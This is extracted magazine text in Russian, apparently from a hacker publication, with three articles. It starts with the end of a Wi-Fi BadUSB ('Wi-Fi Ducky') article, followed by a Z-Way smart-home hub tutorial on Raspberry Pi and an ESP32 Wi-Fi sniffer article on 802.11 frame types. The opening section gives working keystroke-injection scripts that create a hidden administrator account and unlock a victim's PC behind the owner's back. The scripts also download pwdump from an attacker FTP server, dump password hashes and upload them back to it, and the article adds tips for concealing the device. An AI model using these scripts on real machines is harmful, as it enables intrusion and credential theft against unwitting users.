ходимо выполнить какое‐то действие. Для начала создадим скрипт, который
создаст еще одно го пользователя и добавит его в группу «Администраторы».


GUI r
STRING cmd
ENTER
DELAY 100
STRING net user hacker qwerty /add
DELAY 200
STRING net localgroup administrators hacker /add
ALT KEY_F4

Если скетч запустится с правами учетной записи обыч ного пользователя, то
появится сообщение: «Системная ошибка 5. Отказано в доступе». Под адми‐
ном он выполнится менее чем за полсекунды, пос ле чего окно консоли зак‐
роется.


             INFO

                     Для русифи цированных версий Windows придет‐
                        ся указать имя группы «Администраторы» по‐рус‐
                          ски:  net  localgroup  Администраторы
                   hacker /add. Однако для этого потребуются
                      дополнитель ные дей ствия. Подробнее см. статью
                            «Русифицируем уточку. Как заставить BadUSB
                        работать с разными раскладками кла виату ры».


Отлично, теперь необходимо дож даться, пока пользователь заблокирует
компьютер и уйдет, к примеру, на обед. Запускаем скрипт, который раз бло‐
кирует компь ютер под нашим пользователем:


TAB
DELAY 30
TAB
DELAY 30
ENTER
TAB
DELAY 30
TAB
DELAY 30
ENTER

Вуаля! Мы работаем за компьютером жертвы без ее ведома с новой учетной
записью. Конечно, если в системе всего две учетные записи — исходная
и наша.
  Далее, к при меру, можно заг рузить с заранее подготовленного FTP‐сер‐
вера pwdump:


GUI r
DELAY 30
STRING cmd
ENTER
DELAY 30
STRING echo open > ftp.txt & echo ip‐ftp >> ftp.txt & echo user >>
ftp.txt & echo password >> ftp.txt & echo get pwdump.exe >> ftp.txt &
 echo bye >> ftp.txt
ENTER
DELAY 50
STRING ftp –s:ftp.txt
DELAY 3000

После чего мы можем сдампить хеши паролей:


STRING pwdump.exe >> pass.txt

…и заг рузить файл обратно на сервер:


STRING echo open > ftp1.txt & echo ip‐ftp >> ftp1.txt & echo user >>
ftp1.txt & echo password >> ftp1.txt & echo send pass.txt >> ftp1.
txt & echo bye >> ftp1.txt
DELAY 50
STRING ftp –s:ftp1.txt

Останется восполь зовать ся радужными таблицами для расшифровки, и мы
уже владеем учетными записями для продолжения атаки. Устройство все
еще в компьютере, и делать мы можем что угодно в радиусе приема «злого
Wi‐Fi».


ДОРАБАТЫВАЕМ И СОВЕРШЕНСТВУЕМ
Получился довольно неплохой хакерский девайс, но нет предела совер шенс‐
тву. При веду несколько примеров того, как можно доработать это детище.
   Чтобы устройство не све тилось, как гирлянда, в чужом компьютере, можно
заменить светодиоды перемычками или закрасить их лаком для ногтей (в
несколько слоев). Две отладочные пла ты на торчащих проводах явно вызовут
подозрения, поэто му неп лохо было бы подобрать или изготовить для них кор‐
пус.
   Если будет воз можность не просто подобраться к сис темному блоку,
а вскрыть его, то неплохо было бы обза вестись кабелем, который под клю‐
чается к материнской плате напрямую. Это сильно уменьшит шансы того, что
устройство в ско ром времени обнаружат.
   Если устрой ство будет внутри системного блока, то мож но воспользовать‐
ся D1 mini Pro V1.1.0, так как у нее есть разъ ем под внешнюю антенну — она
увеличит ради ус действия.


ЗАКЛЮЧЕНИЕ
Мы сделали усо вер шенствованную модель Rubber Ducky — Wi‐Fi Ducky.
Это довольно опас ное устройство размером со спичечный коробок, причем
его создание не требует больших вложений. Возможность изготовить его
самостоятельно сильно облегчается наличием готовых плат Arduino и скетчей
для них.
  По‐хорошему отладочные платы используют имен но для прототипиро‐
вания, а в даль нейшем раз водят уже свою плату с тем же микроконтроллером
и модулем Wi‐Fi, но без лишних эле ментов. Ее изготовление можно заказать
на заводе. Например, здесь доступно мелкосерийное про изводство от пяти
долларов, и подоб ных сервисов много.
  Можно записать в память Wi‐Fi Ducky скрипты, а затем выполнять их
в любое время и на любой опе рационной системе — встроенной памяти хва‐
тит на тысячи строк кода. Дис танционное управление добавляет устройству
универсальности по сравнению с локаль ными девайсами класса BadUSB.
С ним можно делать на удален ном компьютере что угодно, словно ты сам
сидишь за его клавиатурой.
   Это будет уже не спайка двух отладоч ных плат, торчащая из USB‐порта,
а серьезный Wi‐Fi Ducky — более миниатюрный и надежный, не привлека‐
ющий вни мания.
  Защититься от такого девайса мож но точно так же, как и от Rubber Ducky:
необходимо заб локиро вать добав ление нового HID‐устрой ства средствами
операционной системы либо комплексными системами защиты (Kaspersky,
HEAT Software и прочие Endpoint Security).
ТРЮКИ




    Я ПОКАЖУ ВАМ
  Z-WAY

         ДЕЛАЕМ ХАБ ДЛЯ УМНОГО
        ДОМА НА ОСНОВЕ Z‐WAVE
            И RASPBERRY PI





Если ты пла нируешь сис тему умно го дома
и хочешь с самого начала сделать все
как мож но луч ше, то радиопротокол Z‐Wave
и серверный софт под названи ем Z‐Way —
это надеж ный и пер спективный вариант.          Виталий Юркин                                                                                   Инженер‐программист
В этой статье я подробно расска жу о том,             aivs@yandex.ruумного дома
как сделать хаб своими руками на основе
легкодоступного  одноплатника  Raspberry
Pi, модуля RaZberry и бесплатного софта.


Существуют универсальные софтверные хабы, которые под держи вают мно‐
жество устройств с раз ными протоколами, нап ример openHUB, Home As‐
sistant, Domoticz, ioBrocker. Поддержка Modbus, ZigBee, Z‐Wave, 1‐Wire и дру‐
гих про токолов обеспечива ется с помощью откры тых модулей сторонних раз‐
работчиков.
   Это уни версальный подход, однако в таком варианте страдает качество
работы самих устройств: не все функции поддерживаются, бывает, что
устройства работают некор ректно или не работают вовсе. С контроллером Z‐
Way таких проблем не возникает.





                    Z‐Way — ПО для умного дома

Z‐Way отличается тем, что под держивает любые устрой ства с Z‐Wave,
но дела ет это на основе официаль ных стандартов. Другие протоколы добав‐
ляются с помощью модулей, написанных на C/C++, или приложе ний на Java‐
Script. Использование языка C/C++ позволяет писать быстрые кросс‐плат‐
форменные программы, поэтому Z‐Way может работать как на мощном сер‐
вере, так и на встраиваемой системе. Например, есть сборки для роутеров
Zyxel и накопителей WD. Софт для раз ных платформ ты найдешь на сайте
проекта.


УСТАНОВКА Z-WAY НА RASPBERRY PI





                               RaZberry

Для работы Z‐Way требуется плата RaZberry, устанавлива емая в колодку GPIO
Raspberry Pi. Плата занимает первые десять пинов, но исполь зует только сле‐
дующие: 3,3 В, GND, RX, TX. Z‐Way можно установить на любое поколение
Raspberry Pi.
  Существует несколько способов установки.
  Минимальная установка. На пос леднем Raspbian скачиваем и ставим
в систему пакет deb. При этом будет установ лен только сервер Z‐Wave
без уда лен ного доступа.


$ wget https://storage.z‐wave.me/z‐way‐server/z‐way‐2.3.8_armhf.deb
$ sudo dpkg ‐i z‐way‐2.3.8_armhf.deb

Обычная установка. На последнем Raspbian запус каем уста новочный
скрипт. Будет установлен сервер Z‐Wave и акти виро ван уда ленный доступ.


$ wget ‐q ‐O ‐ razberry.z‐wave.me/install | sudo bash

Максималь ная установка. Есть готовый образ системы c уже установ‐
ленным сервером Z‐Wave, активированным удаленным доступом и нас тро‐
енным Wi‐Fi в режиме точки доступа. Это самый простой и быстрый способ
поднять полноценный хаб умного дома на Raspberry Pi.
   Вот как записать образ на карточку, если у тебя Mac.


$ wget https://storage.z‐wave.me/z‐way‐server/razberry‐2.3.8‐wifi_s
tretch.img.zip
$ unzip razberry‐2.3.8‐wifi_stretch.img.zip
$ diskutil umount /dev/disk2s1
$ sudo dd if=./razberry‐2.3.8‐wifi_stretch.img of=/dev/rdisk2 bs=16m

В Linux различается раз ве что команда монтирования. Но если воз никнут
сложности или у тебя Windows, то можешь воспользоваться сторонним соф‐
том — нап ример, Etcher.
  На свежеустанов ленном Z‐Way нуж но найти IP‐адрес контроллера RaZber‐
ry в локальной сети. Можно пос мотреть на роутере список подклю ченных
устройств, а можно зайти на сайт удален ного доступа https://ﬁnd.z‐wave.me
и увидеть под ключенный контроллер. При первом старте пред лага ется уста‐
новить пароль администратора.





             Вверху отображается ID удаленного доступа


ДОБАВЛЕНИЕ БЕСПРОВОДНЫХ ДАТЧИКОВ Z-WAVE
После  успешного  запуска  сис темы  домашней  автоматизации  можно
добавить пару датчиков Z‐Wave и посмотреть, на что они способны. В моем
распоряжении  оказался  датчик  движения   Philio  PSP05,  работающий
от батарей ки CR123A, и лампа RGBW Z‐Wave.Me ZMR_LBA60 с цоколем E27.





        Минимальный комплект для автоматизации освещения

Переходим на страницу добавления устройств Z‐Wave: «Меню → Устройства
→ Z‐Wave Добавить новое → Автоматически обнаружить Z‐Wave‐устрой‐
ство». Нажимаем «Старт». На дат чике движения в этот момент нужно нажать
кнопку  три раза подряд. При добавлении лампы нужно трижды  вык‐
лючить‐включить выключатель.





                    Добавляем устройства

После успешного добавления датчика и лампы на главной стра нице появится
несколько виджетов устройств, можно использовать их при создании сце‐
нариев или просто управлять техникой с телефона. Лампа позволяет настро‐
ить любой цвет, цветовую температуру от теплого (2600 К) до холодного
(6500 К) и плавно менять яркость. Дат чик движения выполнен в форме и раз‐
мере гла за, годится для скрытой установ ки и при каждом движении отправ‐
ляет коман ду на контроллер.





                      Управление устрой ствами

Веб‐интерфейс — это, конечно, удобно, но куда полезнее и инте рес нее
смотреть лог в консоли.


$ tail ‐f /var/log/z‐way‐server.log





      Лог показы вает в реальном времени все данные радиообмена



                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
 Я ПОКАЖУ ВАМ Z-WAY

         ДЕЛАЕМ ХАБ ДЛЯ УМНОГО ДОМА НА ОСНОВЕ
                             Z‐WAVE И RASPBERRY PI





ДОБАВЛЕНИЕ ПРОВОДНЫХ ДАТЧИКОВ ТЕМПЕРАТУРЫ DS18B20





Z‐Wave‐плата RaZberry занима ет только пер вые десять пинов GPIO. Оставши‐
еся трид цать можно использовать для подключения проводной периферии,
такой как реле, светодиоды и датчики температуры.
   Датчик температуры DS18B20 дешев и удо бен в подключении, работает
по шине 1‐Wire на рас стоянии до 300 м. К одному пину Raspberry Pi можно
подключить несколько десятков датчиков, чего должно хватить для боль шинс‐
тва бытовых нужд. По умол чанию для 1‐Wire используется пин 4, но его перек‐
рывает плата RaZberry, поэтому в конфиге нужно выбрать другой пин, нап‐
ример 24, и активировать работу с 1‐Wire.


$ sudo su
$ echo "dtoverlay=w1‐gpio,gpiopin=24" >> /boot/config.txt
$ echo "w1‐gpio" >> /etc/modules/
$ echo "w1‐therm" >> /etc/modules


             INFO

                     Подключение дат чиков стоит производить на вык‐
                      люченной   Raspberry    Pi,   что бы   слу чайно
                        что‐нибудь не спалить.


Линию данных 1‐Wire нужно подтянуть к питанию 5 В с помощью резистора
на 4,7 Ом и далее можно подключить несколько датчиков температуры. Пины
питания перекрыты пла той RaZberry, но на самой пла те есть дуб лирующие
разъемы, поэтому с под клю чением не будет проб лем.





       Подключение датчика температуры DS18B20 к Raspberry Pi

Чтобы проверить, что все настройки верны и датчики под ключены пра вильно,
нужно заг рузить систему и выпол нить команду


$ ls /sys/bus/w1/devices

Если все в порядке, отобразится список из двух датчиков,  у каждого
из которых можно запросить текущую температуру:


$ cat /sys/bus/w1/devices/28‐6f4580116461/w1_slave





             Смотрим текущую температуру в тер минале

Осталось отобразить показания датчиков в панели домашней авто матизации
Z‐Way. Для этого создадим виртуальное устройство, которое раз в минуту
будет счи тывать показания температу ры.





  Меню → Приложения → Локальные приложе ния → JavaScript‐устройство

Код опроса одного из дат чиков:


$ system('cat /sys/bus/w1/devices/28‐6f4580116461/w1_slave')[1].match
(/t=([\‐0‐9]+)/)[1]/1000


             INFO

                       Чтобы  раз решить  из  системы  автоматизации
                      выполнять сис темные коман ды, нужно в файл /
                   opt/z‐way‐server/automation/.syscom‐
                   mands добавить разрешенную команду cat.


После всех нас троек на панели появятся виджеты дат чиков температуры,
которые мож но исполь зовать для мониторинга и управления кли матом.





                  Виджеты датчиков температу ры


ДОБАВЛЕНИЕ ПРОВОДНЫХ РЕЛЕ ARDUINO





                             Реле

Для Arduino и не толь ко про даются недорогие модули с одним, двумя, пятью
и более реле на бор ту. Модули управля ются от 5 В и коммутируют 220 В, их
можно использовать для управле ния освещением и бытовы ми приборами
типа насосов, проветривателей, вен тиляторов. Под ключив реле к Raspberry
Pi, можно настроить сценарий, где беспровод ной датчик включает свет. Схе‐
ма подключения прос та: модуль подключает ся к питанию 5 В и управляется
с любого сво бодного пина. Для примера я выбрал 25‐й пин.





                       Схема подключения

Проверить работу реле можно из терминала следующими командами:


$ echo "25" > /sys/class/gpio/export
$ echo "out" > /sys/class/gpio/gpio25/direction
$ echo "1" > /sys/class/gpio/gpio25/value
$ echo "0" > /sys/class/gpio/gpio25/value

Чтобы добавить реле в систему автоматизации Z‐Way, нужно создать вир‐
туальное устрой ство: «Меню → При ложе ния → Локаль ные приложения →
JavaScript‐устрой ство».





                      Создание устройства

Команда включить:


$ system("echo '1' > /sys/class/gpio/gpio25/value")

Команда выключить:


$ system("echo '0' > /sys/class/gpio/gpio25/value")


             INFO

                       Чтобы раз решить выполнять системные команды,
                      нужно   в  файл  /opt/z‐way‐server/au‐
                   tomation/.syscommands добавить разрешен‐
                     ную команду echo.





           Теперь можно управлять реле из веб‐панели Z‐Way

При каж дой перезагрузке потребуется инициализировать 25‐й пин на выход,
поэтому создадим загрузочный скрипт инициализации: «Меню → При ложе‐
ния → Локаль ные приложения → Пользовательский код JavaScript».





Команды инициализации 25‐го пина на выход:


$ system("echo '25' > /sys/class/gpio/export")
$ system("echo 'out' > /sys/class/gpio/gpio25/direction")


НАСТРОЙКА АВТОМАТИЗАЦИИ
В Z‐Way встроено более пятидесяти приложений автоматизации, и еще более
ста можно заг рузить из бес плат ного онлайнового магазина.





                   Приложения автоматизации

Есть при ложение «Умное осве щение», в настройках которого нужно только
выбрать датчик движения и све тодиодную лампу. Предположим, алгоритм
работы будет следующий: с 7:00 до 00:00 лампа будет включать ся на мак‐
симум, с 00:00 до 7:00 — только на 20%.





                   Так выг лядит настройка приложения

Один из датчиков температуры и реле можно задействовать для управления
обогревателем с помощью приложения «Виртуальный тер мостат». В нас‐
тройках при ложения нужно выбрать датчик тем перату ры, реле, задать гис‐
терезис и режим «Обогрев/Охлаждение». В режиме «Обогрев» реле будет
выключаться при дос тижении заданной температуры.





                     Виртуальный тер мостат

И если вдруг из более чем 150 при ложе ний не найдется ни одного под‐
ходящего, то всегда можно написать свое на JavaScript. Система автомати‐
зации пол ностью открытая, исходники ты найдешь на GitHub.
ТРЮКИ
ВАЯЕМ
СНИФФЕР
НА ESP32





     Егор Литвинов




 СЛУШАЕМ ВАЙФАЙ,
 ПРИЦЕЛИВАЕМСЯ НА БЛЮТУС!





Все началось с того, что однажды у нас в GS‐Labs наметил ся
проект по поис ку багов и уяз вимос тей. Да вот только дошли
слухи, что железка, где дол жно работать приложе ние, будет
хитрая — нельзя пос тавить  root, нет любимо го Ethernet.
«Орга ны управления» — только Wi‐Fi да пультик управле ния
на нес коль ко кнопочек, а что будет передаваться по Wi‐Fi —
неизвестно. А хакеры, как ты зна ешь, не любят неиз вес тнос‐
ти! Дома у меня валялись пара отла дочных плат на основе
ESP32 — ESP32‐PICO‐KIT, и я решил сделать свой Wi‐Fi‐
сниффер — с блек‐джеком и перспек тивой расширения
до Bluetooth‐сниф фера!





                           ESP32‐DevKitC





Глос сарий
 • AP (access point) — точка доступа.
 • BSSID (basic service set identiﬁer) — обычно MAC‐адрес точки доступа.
 • BSS (basic service set) — группа устрой ств, которые успешно синхронизи‐
   рованы для обще ния с помощью 802.11.
 • DA (destination address) — MAC‐адрес конечного наз начения.
 • DS (distribution system) — система, объеди няющая BSS и LAN.
 • ESS (extended service set) — нес колько BSS, объеди ненных в единое
   целое, обра зующее DS.
 • MPDU (MAC protocol data unit) — фактически это фрейм 802.11.
 • MSDU (MAC service data unit) — payload, который содержит IP‐пакет + дан‐
  ные LLC.
 • PLCP (physical layer convergence procedure) — подуровень (физический
   уровень PHY делится в 802.11 на две части), который отвечает за под‐
   готовку к отправ ке фрей ма, пос тупившего с MAC‐уровня.
 • PSDU (PLCP service data unit) — считай, то же самое, что и MPDU, толь ко
  MPDU смот рим «сверху вниз» по модели OSI, PSDU — «сни зу вверх»
   по модели OSI.
 • SA (source address) — MAC‐адрес исходного отправителя.
 • STA (station) — любое устройство, под держивающее 802.11, например
   твой смар тфон, ноут или «малин ка» (Raspberry Pi 3).




ТЕХНИЧЕСКАЯ БАЗА
Думаю, ни для кого не секрет, что бал сегодня правят мик рокон троллеры
семейства STM32Fxxx (циф ры и буквы на месте ххх означают класс устрой‐
ства — от Ultra‐low power до High Performance). Но пару лет назад появился
«чудо‐чип» под названием ESP32 —  «стар ший брат» народного  Wi‐Fi
ESP8266.
  Изначально документация на этот чип была очень и очень скудна, но сей‐
час ситуация кар диналь но изме нилась. Есть прекраснейший user guide,
содержащий пошаговые инструкции по всем вопросам — от установки SDK
и toolchain для этого микроконтроллера до описания его периферии. Все
это приправлено массой примеров, выложен ных на Гитхаб. Помимо это го,
есть очень хороший блог, где наглядно расписывается, как работать с той
или иной периферией.
  Надо отдать разработ чикам должное, Espressif описывает, как уста нав‐
ливать toolchain для популярных плат форм:





Вся документация представлена в двух вариациях:
 • ветка latest, которая включает все современные и передовые фичи SDK.
  Правда, они еще не оттестированы как следует;
 • ветка stable (на момент написания статьи stable был  3.1.2), которая
   не содер жит всех новинок, но рекомендована для production purposes.





Да, забыл упомянуть их шикарный форум, где можно обсудить вопросы, свя‐
занные с ESP32. Складывается впечат ление, что техподдержка Espressif отве‐
чает достаточно шустро.
  В одной из наших статей мы уже упо минали этот чип, поэтому здесь я лишь
кратко перечис лю основные характеристики:
 • 32‐bit MCU Xtensa® single‐/dual‐core 32‐bit LX6 microprocessor(s), который
  может работать в широком диапазоне частот;





 • 520 Кбайт SRAM;
 • «стандартный» набор периферии, представленный в виде UART/SPI/I2C,
   SDcard, Ethernet MAC (RMII), CAN2.0;
 • Wi‐Fi (802.11b/g/n);
 • Bluetooth (Bluetooth v4.2 BR/EDR and BLE speciﬁcations).

Фанатам ассемблера производитель сделал царский подгон, любезно пре‐
доставив ULP (Ultra Low Power) сопроцессор, который кодит ся ассемблером
и кушает до 150 мкА в режиме Deep‐sleep (это для тех, кто хочет мак сималь‐
ной автономности). Да и вообще, не ленись заглянуть в даташит за деталями,
там реаль но мно го интересного.
   Кстати, если к этому моменту я уже внушил тебе сильное желание обза‐
вестись дан ным чипом и ты уже начал вспоминать пароль от «Алиэкспресса»
и адрес ближайшего отделения Почты России, то не спеши. :) Удивитель но,
но раз ные варианты ESP32 можно купить у нас, причем порой это может ока‐
заться дешевле и быс трее, чем заказывать из Китая. Например, вот такую
двухсанти метровую штуку с возможностью подклю чения внешней антенны:





можно купить тут или тут примерно за четыре доллара.


ТЕОРИЯ WI-FI (ДА, БЕЗ НЕЕ НЕ ОБОЙТИСЬ)
Возьму‐ка я на себя очень амбициозную миссию: изложить три тысячи стра‐
ниц стан дарта в нескольких предложениях. :) Думаю, что у меня получится,
отступать ведь все равно поздно?
  Думаю, ты уже знаешь, что Wi‐Fi — это «красивое» наз вание, которое
скрывает под собой целый набор стан дартов 802.11. Вот лишь «некото рая
часть» из них:
 • 900 МГц — 802.11ah;
 • 2,4 ГГц — 802.11b, 802.11g, 802.11n, 802.11ax;
 • 3,6 ГГц — 802.11y;
 • 4,9 ГГц — 802.11j;
 • 5 ГГц — 802.11a, 802.11n, 802.11ac, 802.11ax;
 • 5,9 ГГц — 802.11p;
 • 45 ГГц — 802.11aj;
 • 60 ГГц — 802.11aj, 802.11ay.

Поскольку для этого про екта нам нужно знание деталей, а не умение запус‐
тить magic‐утилиту на wonderful‐железке, давай заглянем внутрь 802.11 пог‐
лубже. Итак, согласно IEEE 802.11—2012, MAC‐фрейм имеет следующую
структуру:





Теперь прой демся по каж дому полю, чтобы понимать, за что оно отвечает.


Frame Control





 • Protocol version — согласно рассматриваемому стандарту, значение всег‐
   да 0. Остальные возможные значения зарезервированы.
 • Type and Subtype — описыва ют тип и подтип фрейма. Всего существует
   три типа фрей мов: Management, Data, Control с подтипами.





О том, какие бывают Management‐, Control‐ и Data‐фреймы, ты прочитаешь,
как только закон чим рассмат ривать MAC‐заголовок 802.11.
 • TO_DS, FROM_DS — их сто ит рассмат ривать вместе, и они отвечают за то,
   как интер пре тиро вать поля Address 1 … Address 4 из заголовка фрейма.
  Посмотрим на табличку ниже:





 • Source Address (SA) — MAC‐адрес исходно го отправителя (твой смарт
   или ноут, с которого выходишь в паутину).
 • Destination Address (DA) — MAC‐адрес конечного назначения (тот сервак,
   куда ты зашел, чтобы прочитать эту статью).
 • Transmitter Address (TA) — MAC‐адрес, переда ющий фрейм 802.11 (точка
   доступа, через которую ты сидишь).
 • Receiver Address (RA) — MAC‐адрес, принима ющий фрейм 802.11.
 • Basic Service Set Identiﬁer (BSSID) — L2 identiﬁer of the basic service set
   (BSS).

Четвертый случай (когда оба бита выставлены в единицу) наглядно пояснит
вот такая кар тинка:





 • More Frag выставляется в единич ку во всех Data‐ и Management‐фреймах,
   указывающих, что есть еще фрагменты в текущем MSDU или MMPDU.
 • Retry устанавливается в единичку, ког да фрейм является повторной
   передачей более раннего фрей ма.
 • Power Mgmt уста навливается в еди ницу, когда клиент показывает, что
   находится в режиме Power Save mode; необходимо буферизировать тра‐
   фик, получаемый со стороны клиента.
 • More Data выс тавляется в единицу, тем самым AP (точка доступа) указыва‐
   ет клиенту (STA), который находится в Power Save Mode, что для него есть
  еще данные и «ложиться спать» еще рано.
 • Protected Frame — как, думаю, ты уже догадываешься из названия, еди‐
   ница в этом бите указывает на то, что фрейм у нас зашифрован.
 • Order устанавливается в любом non‐QOS Data‐фрейме, когда приложение
   требует, чтобы дан ные были отправлены строго упорядоченно.


Duration/ID
Несколько загадочное поле, поскольку смысл, который будет в этих 16 битах,
сильно зависит от того, какой у нас фрейм — Data, Control или Management.
Как вари ант — если у нас Control PS‐Poll фрейм (об этом будет сказано даль‐
ше), то тут будет содержаться идентификатор AID. А может быть указано вре‐
мя в микросекундах, требуемое для передачи сле дующего фраг мента в Data
Frame.


Еще одна инте рес ная желез ка от Cypress
CYW43907 привлекательна тем, что поддержи вает Dual Band (2,4/5 ГГц) и на
борту у нее USB 2.0. И что для нас самое интересное — вроде как поддержи‐
вает нераз борчи вый режим. Почему говорю «вроде как» — однозначного
упоминания в документации и programming user guide я не встретил, но если
посмотреть сюда, то в этой ветке форума говорится, что с SDK 2.4.1 появи‐
лась фун кция wiced_wiﬁ_enable_monitor_mode(), которая позволяет прос‐
лушивать эфир и фреймы capture 802.11.



Sequence Control





Как видим из картинки выше, делится, в свою очередь, на Fragment Number
и  Sequence  Number.  Sequence Number  указывает  порядковый номер
в MSDU‐, A‐MSDU‐ или MMPDU‐фрей мах. Fragment Number указывает номер
каждого фрагмента в MSDU‐ или MMPDU‐фрей мах. Чтобы более четко
понять, как используется Sequence Number в связ ке с Fragment Number, пос‐
мотри на картинку ниже.





Нам надо передать данные размером в 1200 байт, но точка доступа скон‐
фигури рова на так, что размер передаваемого фрейма составляет 300 байт.
Передача единого сообщения в 1200 байт будет выглядеть сле дующим обра‐
зом.





QoS Control
Шестнадцатое поле, которое отвечает quality‐of‐service в Data frame.


HT Control
Последнее поле — HT Control, которое может встречаться в MAC‐заголовке
фрейма 802.11. Стандарт 802.11n рас ширяет заголовок данных полем раз‐
мером в четыре байта. Присутс твует только в QoS Data‐ и Management‐фрей‐
мах и опре деляется Order bit из Frame Control.


Body
В поле Body «упаковываются» вышестоящие про токолы.


                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
    ВАЯЕМ СНИФФЕР
           НА ESP32
             СЛУШАЕМ ВАЙФАЙ, ПРИЦЕЛИВАЕМСЯ
                                  НА БЛЮТУС!





ПОДТИПЫ ФРЕЙМОВ
Как и было обе щано, теперь поговорим немного детальнее о том, какие
бывают подтипы у Control‐, Management‐ и Data‐фрей мов.


Management frame
Как следует из названия, дан ный тип фреймов служит своеоб разным «ске‐
летом» для пос троения беспроводной сети.





Beacon Frame





В основном используется точ кой доступа (ну или в режиме IBSS — когда
устройства пытаются образовать ad‐hoc‐сеть, то есть когда ты хочешь под‐
ружить свой смартфон с ноутом нап рямую без точки доступа). Точка доступа
периодически отправляет биконы для анонсирования своего присутствия
и предоставления необходимой информа ции (SSID, частотный канал, вре‐
менные маркеры для синхронизации устройств по времени, поддерживаемые
скорости, возможности обеспечения QoS и подобное) всем устройствам
в зоне ее пок рытия.


Probe Request Frame
Это когда ты, уважаемый читатель, включаешь на смартфоне Wi‐Fi, чтобы под‐
ключиться  к  какой‐нибудь  бес проводной  сетке.  Отправляется  обычно
на широковеща тельный DA‐адрес (ff:ff:ff:ff:ff:ff).


Probe Response Frame
Получив Probe Request, точ ка доступа или клиентское устрой ство в режиме
IBSS отправляет данный фрейм. Формат фрейма очень похож по структуре
на Beacon‐фрейм и содер жит информацию, необходимую для подключения
и установления соеди нения.


Authentication Frame





Association request





Содержит информа цию о радиокарте устройства (например, поддержи‐
ваемые ско рости передачи данных) и SSID сети WLAN, с которой устройство
хочет быть ассо циировано. После получе ния запроса на ассоциацию точка
доступа решает вопрос по ассоциированию с радиокартой и, если принято
положительное решение, резервирует область памяти и формирует иден‐
тификатор сессии AID (Association Identiﬁer) для данной радиокар ты (устрой‐
ства пользователя)


Association response





Disassociation Frame





Поле DA может быть как конкретным адресом клиента, с которым надо разъ‐
единиться, так и широковещатель ным, если AP решит разорвать соединения
со всем. Но стоит учитывать, что деассоциированная STA все еще находит ся
в состоянии авторизации с точкой доступа. Данный фрейм используется, ког‐
да точке доступа или кли енту надо пересмотреть параметры свя зи.


Deauthentication Frame
Формат ана логи чен Disassociation Frame. Данный тип фрейма используется,
когда необходимо разорвать все виды ком муника ций между кли ентом и точ‐
кой доступа. Распознаются Deauthentication Frame и Disassociation Frame
с помощью поля Subtype. На том же ESP8266 реализована атака под наз‐
ванием  Deauther. Заинтересовавшимся смотреть ESP8266 Deauther  2.0
или Wi‐PWN.


Reassociation Request Frame





Данный фрейм отправляется исключительно кли ентом на точку доступа. Воз‐
никает эта ситу ация, когда STA подключена к ESS и хочет переподключить ся
к другой точке дос тупа, подсоединенной к той же ESS (расширенная зона
обслуживания ESS — Extended Service Set).





Control frame
Одна из фишек этих фреймов (и их отли чие от Management‐ и Data‐фрей‐
мов) — у них нет поля Body. Ниже показаны основные типы Control frame:





RTS/CTS Frames





Расшифровываются они, соответс твенно, как request to send (RTS) и clear
to send (CTS). В целом служат для улуч шения взаимодействия между STA и AP.
Представь, что точ ка доступа у тебя стоит около капиталь ной стены, ты
сидишь в инете со смартфона, а твой друг в другом конце квартиры сидит
за ноутом. Оба ваших устрой ства прекрасно видят точ ку доступа, но вот
в ради оэфи ре уже не слы шат друг друга, и, чтобы оба могли почитать
любимые статьи на ][, ваши железки будут использовать данные фреймы.
  Мобильные устрой ства отправляют RTS‐фрейм  к дру гому устройству
как первую фазу в двухшаговом процес се, необходимом до отправки фрейма
данных. В ответ придет CTS‐фрейм, где будет указано, на какое время все
остальным устройствам в сети стоит помолчать.


Acknowledgement Frame





Мы живем далеко не в идеальном мире… где сущес твует масса помех, осо‐
бенно когда речь идет о передаче чего‐либо по радиоканалу. Дан ный фрейм
будет сгенерирован получа телем после проверки на ошибки полученного
Data‐фрей ма.


Block Acknowledgement Request





Основная идея — улучшить/ускорить передачу данных, подтверждая сра зу
несколько при нятых Data‐фреймов, а не каждый по отдельности. Но прежде
чем начать использовать такой хук, надо убедиться, что получатель знает
про него.
 • RA — MAC‐адрес получателя.
 • TA — MAC‐адрес отправите ля фрейма BlockAck‐Req.


Block Acknowledgement





Собственно фрейм под тверждения, который генерируется в случае успе ха
нескольких QoS Data‐фреймов, вместо того чтобы под тверждать каждый
в отдельности.
 • RA — MAC‐адрес устройства, который запрашивает фрейм Block Ack.
 • TA — MAC‐адрес узла, который передает Block Ack.


PS-Poll





Когда конечное устрой ство проснулось после спяч ки и получило Beacon, про‐
веряет наличие AID и TIM (фак тически озна чает, что точка дос тупа имеет
некие данные, которые надо отправить на конечное устройство). В этом слу‐
чае STA отправ ляет PS‐Poll на точ ку доступа, сигнализируя о том, что готова
принять накоп ленные для нее данные.
 • BSSID (RA) — MAC‐адрес точ ки дос тупа, к которой подклю чен клиент.
 • TA — MAC‐адрес кли ента, который сгенерировал PS‐Poll.


Control Wrapper





Определен в стандарте 802.11n, который дает очень «интересное» трак‐
тование данного фрейма — он используется с любыми другими Control Frame
(исключая Control Wrapper frame) вмес те с полем HT Control.


Contention Free





Оба фрей ма слу жат для информи рова ния о том, что закончился CFP (con‐
tention‐free period). Во втором случае требуется фрейм под тверждения.


Data Frame
Если ты еще помнишь, как описывается данный фрейм в Control Frame, то
тебя не должно удивлять, что существу ет 15 различных типов Data Frame.





Наблюдательный читатель заметит, что Data Frame следует разделить еще на
две «боль шие» категории: Data Frame, который содержит данные и который
не содер жит данные. Напрашивается воп рос: зачем делать Data Frame,
который не содержит данных? Ответ, возможно, тебя удивит: иногда надо
передать слу жеб ную информацию точке доступа или другому участнику сети.
Иногда узлы исполь зуют Null data frames, чтобы акти визировать или завер‐
шить power save mode.
   Кстати, здесь стоит упо мянуть возможность фрагментации фрейма.





С одной сто роны, вроде бы увеличиваем overhead, но, с дру гой сто роны,
если произойдет коллизия, то передавать надо будет не jumbo‐фрейм, а все‐
го лишь небольшой кусочек, что положительно ска жет ся на пропус кной спо‐
собности.
   «Контрольным выстрелом» будет наличие A‐MSDU (aggregate MAC service
data unit) и A‐MPDU (aggregate MAC protocol data unit). Что бы внести неболь‐
шую ясность, сначала дадим еще несколь ко определений.
   По‐простому MSDU — payload, содержащий IP‐пакет + некоторые данные
LLC. MPDU — это фрейм 802.11, PLCP — physical layer convergence procedure.
Вот так выг лядит процесс агрегации для A‐MSDU.





Если разрешено шиф рование, то несколько MSDU шиф руются как единое
целое. Не стоит забывать, что MSDUs могут собираться в один MPDU в слу‐
чае, когда DA‐ и SA‐адреса отображаются на одинаковые RA и TA.
